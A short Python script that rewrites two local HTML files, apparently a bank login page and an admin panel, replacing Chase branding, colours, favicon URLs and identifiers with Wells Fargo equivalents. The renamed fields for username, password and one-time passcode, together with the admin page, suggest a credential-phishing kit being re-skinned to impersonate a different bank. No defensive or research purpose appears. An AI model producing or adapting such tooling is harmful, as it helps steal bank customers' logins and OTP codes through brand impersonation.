import os

files_to_update = [
    r"C:\Users\xingk\bank\index.html",
    r"C:\Users\xingk\bank\admin.html"
]

replacements = {
    # Colors
    "#004a99": "#d71e28",  # Chase blue to WF red
    "#005eb8": "#d71e28",  # Chase light blue to WF red
    "#003b73": "#a61a1d",  # Chase dark blue to WF dark red
    
    # Text
    "Chase Bank": "Wells Fargo",
    "Chase Support": "Wells Fargo Support",
    "Chase": "Wells Fargo",
    "CHASE": "WELLS FARGO",
    
    # URLs and Images
    "https://www.chase.com/etc/designs/chase-ux/favicon.ico": "https://www.wellsfargo.com/favicon.ico",
    "https://www.chase.com/etc/designs/chase-ux/apple-touch-icon.png": "https://www.wellsfargo.com/apple-touch-icon.png",
    
    # JS variables and IDs
    "chaseUser": "wfUser",
    "chasePass": "wfPass",
    "chaseOtp": "wfOtp",
    "submitChaseLogin": "submitWfLogin",
    "submitChaseOtp": "submitWfOtp"
}

for file_path in files_to_update:
    if os.path.exists(file_path):
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
            
        for old_str, new_str in replacements.items():
            content = content.replace(old_str, new_str)
            
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(content)
        print(f"Successfully updated {file_path}")
    else:
        print(f"File not found: {file_path}")
